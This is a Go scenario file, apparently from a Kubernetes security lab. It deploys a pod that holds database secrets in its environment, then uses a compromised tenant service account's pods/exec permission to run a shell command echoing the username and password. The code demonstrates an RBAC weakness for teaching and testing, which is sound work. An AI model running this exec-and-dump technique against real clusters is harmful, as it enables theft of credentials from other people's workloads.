package scenarios

import (
	"bytes"
	"context"
	"fmt"
	"strings"
	"time"

	"k8s-security-lab/internal/cluster"

	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/remotecommand"
)

func ExecAttack() error {
	fmt.Println("[*] Starting pod exec abuse scenario")

	namespace := "tenant-a"
	serviceAccountName := "tenant-sa"
	victimPodName := "exec-victim"

	adminClient, err := cluster.GetClient()
	if err != nil {
		return err
	}

	compromisedConfig, err := cluster.GetServiceAccountConfig(namespace, serviceAccountName)
	if err != nil {
		return err
	}

	err = adminClient.CoreV1().
		Pods(namespace).
		Delete(context.Background(), victimPodName, metav1.DeleteOptions{})
	if err != nil && !apierrors.IsNotFound(err) {
		return err
	}

	fmt.Println("[*] Deploying victim workload with credentials in the container environment")

	victimPod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      victimPodName,
			Namespace: namespace,
			Labels: map[string]string{
				"app": "exec-victim",
			},
		},
		Spec: corev1.PodSpec{
			RestartPolicy: corev1.RestartPolicyAlways,
			Containers: []corev1.Container{
				{
					Name:  "app",
					Image: "alpine",
					Command: []string{
						"/bin/sh",
						"-c",
						"sleep 3600",
					},
					Env: []corev1.EnvVar{
						{
							Name: "DB_USERNAME",
							ValueFrom: &corev1.EnvVarSource{
								SecretKeyRef: &corev1.SecretKeySelector{
									LocalObjectReference: corev1.LocalObjectReference{
										Name: "db-credentials",
									},
									Key: "username",
								},
							},
						},
						{
							Name: "DB_PASSWORD",
							ValueFrom: &corev1.EnvVarSource{
								SecretKeyRef: &corev1.SecretKeySelector{
									LocalObjectReference: corev1.LocalObjectReference{
										Name: "db-credentials",
									},
									Key: "password",
								},
							},
						},
					},
				},
			},
		},
	}

	_, err = adminClient.CoreV1().
		Pods(namespace).
		Create(context.Background(), victimPod, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	fmt.Println("[+] Victim pod deployed")
	fmt.Println("[*] Waiting for the victim pod to become ready")

	_, err = waitForPodCompletion(adminClient, namespace, victimPodName, 45*time.Second)
	if err != nil {
		return err
	}

	fmt.Printf("[*] Using compromised %s/%s identity to exec into the victim pod\n", namespace, serviceAccountName)

	output, err := execInPod(
		compromisedConfig,
		adminClient,
		namespace,
		victimPodName,
		"app",
		[]string{"/bin/sh", "-c", "echo username=$DB_USERNAME; echo password=$DB_PASSWORD"},
	)
	if err != nil {
		fmt.Println("[!] Exec request failed")
		return err
	}

	fmt.Println("[+] Remote command execution succeeded")

	fmt.Println("\nEvidence:")
	fmt.Println(strings.TrimSpace(output))

	fmt.Println("\nImpact:")
	fmt.Println("- Attacker can run commands inside existing workloads")
	fmt.Println("- In-container env vars and mounted credentials become accessible")
	fmt.Println("- pods/exec is an interactive code execution primitive")

	return nil
}

func execInPod(cfg *rest.Config, client *kubernetes.Clientset, namespace, podName, containerName string, command []string) (string, error) {
	req := client.CoreV1().
		RESTClient().
		Post().
		Resource("pods").
		Name(podName).
		Namespace(namespace).
		SubResource("exec")

	req.VersionedParams(&corev1.PodExecOptions{
		Command:   command,
		Container: containerName,
		Stdout:    true,
		Stderr:    true,
	}, scheme.ParameterCodec)

	executor, err := remotecommand.NewSPDYExecutor(cfg, "POST", req.URL())
	if err != nil {
		return "", err
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer

	err = executor.Stream(remotecommand.StreamOptions{
		Stdout: &stdout,
		Stderr: &stderr,
	})
	if err != nil {
		if stderr.Len() > 0 {
			return "", fmt.Errorf("%w: %s", err, stderr.String())
		}
		return "", err
	}

	return stdout.String(), nil
}
